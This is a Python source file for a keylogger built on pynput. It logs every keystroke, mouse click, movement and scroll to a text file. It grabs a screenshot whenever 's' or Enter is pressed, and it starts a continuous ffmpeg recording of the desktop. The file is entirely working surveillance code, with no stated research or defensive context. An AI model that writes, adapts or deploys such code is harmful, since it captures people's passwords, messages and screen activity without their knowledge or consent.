import logging
import os
from datetime import datetime
import subprocess
import sys

from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from pynput.keyboard import Key

class KeyLogger:
    def __init__(self):
        self.log_file = None
        self.setup_logger()
        self.dpi = 96

    def setup_logger(self):
        logging.basicConfig(filename='key_inputs.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
        self.log = logging.getLogger()

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == Key.space:
                current_key = "SPACE"
            elif key == Key.esc:
                current_key = "ESC"
            else:
                current_key = str(key)
        self.log.info(f"{current_key} pressed")

        if current_key == 's' or key == Key.enter:
            self.take_screenshot()

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.log.info(f"Mouse {action} at ({x}, {y}) with {button}")

    def on_move(self, x, y):
        x_cm = x / self.dpi * 2.54
        y_cm = y / self.dpi * 2.54
        self.log.info(f"Mouse moved to ({x_cm:.2f} cm, {y_cm:.2f} cm)")

    def on_scroll(self, x, y, dx, dy):
        x_cm = x / self.dpi * 2.54
        y_cm = y / self.dpi * 2.54
        dx_cm = dx / self.dpi * 2.54
        dy_cm = dy / self.dpi * 2.54
        self.log.info(f"Mouse scrolled at ({x_cm:.2f} cm, {y_cm:.2f} cm) with delta ({dx_cm:.2f} cm, {dy_cm:.2f} cm)")

    def start(self):
        keyboard_listener = Listener(on_press=self.on_press)
        mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)

        keyboard_listener.daemon = True
        mouse_listener.daemon = True

        keyboard_listener.start()
        mouse_listener.start()

        self.start_recording()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            keyboard_listener.stop()
            mouse_listener.stop()
            sys.exit(0)

    def take_screenshot(self):
        screenshots_dir = os.path.join(os.getcwd(), 'screenshots')
        if not os.path.exists(screenshots_dir):
            os.makedirs(screenshots_dir)

        screenshot = ImageGrab.grab()
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_filename = f'screenshot_{timestamp}.png'
        screenshot_path = os.path.join(screenshots_dir, screenshot_filename)
        screenshot.save(screenshot_path)
        self.log.info("Screenshot captured")

    def start_recording(self):
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        command = [
            'C:/ffmpeg/bin/ffmpeg.exe',
            '-f', 'gdigrab',
            '-framerate', '30',
            '-i', 'desktop',
            '-c:v', 'libx264',
            '-preset', 'ultrafast',
            f'screenrecord_{timestamp}.mp4'
        ]
        recording_process = subprocess.Popen(command)
        self.log.info("Screen recording started")


if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
